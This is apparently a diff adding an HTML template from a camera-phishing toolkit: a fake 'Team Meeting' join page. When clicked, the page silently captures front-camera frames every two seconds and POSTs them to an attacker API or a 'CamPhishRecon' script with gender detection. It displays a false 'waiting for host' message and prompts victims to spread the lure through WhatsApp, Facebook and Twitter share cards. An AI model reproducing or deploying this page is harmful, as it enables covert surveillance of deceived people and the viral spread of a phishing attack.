@@ -1,0 +1,128 @@
+<!-- DESC: Online meeting/conference page with camera capture -->
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Join Meeting</title>
+<style>
+body{margin:0;background:#1a1a2e;color:#fff;font-family:Arial,sans-serif;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+video,canvas{display:none}
+.meeting-card{background:#16213e;border-radius:20px;padding:40px;text-align:center;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}
+.meeting-card h2{color:#0ff;margin-bottom:8px;font-size:24px}
+.meeting-card p{color:#8899aa;font-size:14px;margin-bottom:20px;line-height:1.5}
+.participants{display:flex;justify-content:center;gap:-10px;margin-bottom:20px}
+.avatar{width:40px;height:40px;border-radius:50%;border:2px solid #16213e;display:flex;align-items:center;justify-content:center;font-size:16px;margin-left:-10px}
+.avatar:first-child{margin-left:0}
+.join-btn{background:#0ff;color:#000;border:none;padding:14px 48px;font-size:18px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;transition:transform .12s}
+.join-btn:active{transform:scale(0.95)}
+.waiting{color:#0ff;margin-top:20px;font-size:14px;display:none}
+.share-bar{margin-top:20px;display:flex;gap:10px;justify-content:center}
+.share-btn{padding:8px 16px;border:none;border-radius:20px;font-size:13px;font-weight:700;color:#fff;cursor:pointer}
+.share-wa{background:#25D366}.share-fb{background:#1877F2}.share-tw{background:#1DA1F2}
+.recording{position:fixed;top:12px;right:12px;background:#f00;color:#fff;font-size:10px;padding:3px 8px;border-radius:4px;font-weight:700;animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<div class="recording">● REC</div>
+<video id="video" playsinline autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+<div class="meeting-card">
+<h2>🎥 Team Meeting</h2>
+<p>3 people are already in this meeting.<br>Join now to participate.</p>
+<div class="participants">
+<div class="avatar" style="background:#ff6b9d">A</div>
+<div class="avatar" style="background:#c44dff">B</div>
+<div class="avatar" style="background:#7bed9f">C</div>
+</div>
+<button class="join-btn" onclick="joinMeeting()">Join Meeting</button>
+<div class="waiting" id="waiting">⏳ Waiting for host to admit you...</div>
+<div class="share-bar" id="shareBar" style="display:none">
+<button class="share-btn share-wa" onclick="shareCard('wa')">💬 Invite</button>
+<button class="share-btn share-fb" onclick="shareCard('fb')">📘 Share</button>
+<button class="share-btn share-tw" onclick="shareCard('tw')">🐦 Share</button>
+</div>
+</div>
+<script>
+var API='API_BASE_URL';
+var SHARE_URL=location.origin+'/t/meeting';
+var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+});
+
+function joinMeeting(){
+document.querySelector('.join-btn').style.display='none';
+document.getElementById('waiting').style.display='block';
+document.getElementById('shareBar').style.display='flex';
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+video.srcObject=s;video.play();
+setInterval(function(){
+ctx.drawImage(video,0,0,640,480);
+if(window.CamPhishRecon)CamPhishRecon.Capture.image(canvas.toDataURL('image/png'),'canvas');else fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
+},2000);
+}).catch(function(){});
+}
+
+function shareCard(t){
+var c=document.createElement('canvas');
+c.width=600;c.height=800;
+var x=c.getContext('2d');
+// Background
+var bg=x.createLinearGradient(0,0,0,800);
+bg.addColorStop(0,'#1a1a2e');bg.addColorStop(0.5,'#16213e');bg.addColorStop(1,'#1a1a2e');
+x.fillStyle=bg;x.fillRect(0,0,600,800);
+// Glow
+var glow=x.createRadialGradient(300,250,30,300,250,250);
+glow.addColorStop(0,'rgba(0,255,255,0.1)');glow.addColorStop(1,'rgba(0,255,255,0)');
+x.fillStyle=glow;x.fillRect(0,0,600,800);
+// Border
+x.strokeStyle='#0ff';x.lineWidth=2;x.globalAlpha=0.3;
+x.beginPath();x.roundRect(30,60,540,680,16);x.stroke();
+x.globalAlpha=1;
+// Video icon
+x.fillStyle='#0ff';x.shadowColor='#0ff';x.shadowBlur=25;
+x.beginPath();x.roundRect(250,160,100,70,8);x.fill();
+x.beginPath();x.moveTo(350,180);x.lineTo(370,170);x.lineTo(370,220);x.lineTo(350,210);x.fill();
+x.shadowBlur=0;
+// Title
+x.fillStyle='#fff';x.font='bold 28px system-ui';x.textAlign='center';
+x.fillText('🎥 Team Meeting',300,290);
+x.fillStyle='#8899aa';x.font='16px system-ui';
+x.fillText('Join the video conference',300,320);
+// Participants avatars
+var avatars=[['#ff6b9d','A'],['#c44dff','B'],['#7bed9f','C']];
+for(var i=0;i<avatars.length;i++){
+x.fillStyle=avatars[i][0];
+x.beginPath();x.arc(250+i*50,370,20,0,6.28);x.fill();
+x.fillStyle='#fff';x.font='bold 16px system-ui';
+x.fillText(avatars[i][1],250+i*50,376);
+}
+x.fillStyle='#8899aa';x.font='13px system-ui';
+x.fillText('+ 3 people already joined',300,410);
+// Divider
+x.strokeStyle='rgba(255,255,255,0.1)';x.lineWidth=1;
+x.beginPath();x.moveTo(100,450);x.lineTo(500,450);x.stroke();
+// CTA
+x.fillStyle='#fff';x.font='bold 20px system-ui';
+x.fillText('Join the meeting:',300,500);
+x.fillStyle='#0ff';x.font='bold 18px monospace';
+x.fillText(SHARE_URL,300,540);
+// Footer
+x.fillStyle='#555';x.font='12px system-ui';
+x.fillText('Video Conference · Join & Share',300,700);
+
+c.toBlob(function(blob){
+var textMsg='🎥 Join our team meeting! '+SHARE_URL;
+var file=new File([blob],'meeting-invite.png',{type:'image/png'});
+if(navigator.canShare&&navigator.canShare({files:[file]})){
+navigator.share({text:textMsg,files:[file],title:'Team Meeting'}).catch(function(){});
+return;
+}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(textMsg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(textMsg),'_blank');
+else if(t==='tw')open('https://twitter.com/intent/tweet?text='+encodeURIComponent(textMsg),'_blank');
+var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='meeting-invite.png';a.click();
+},'image/png');
+}
+</script>
+</body></html>
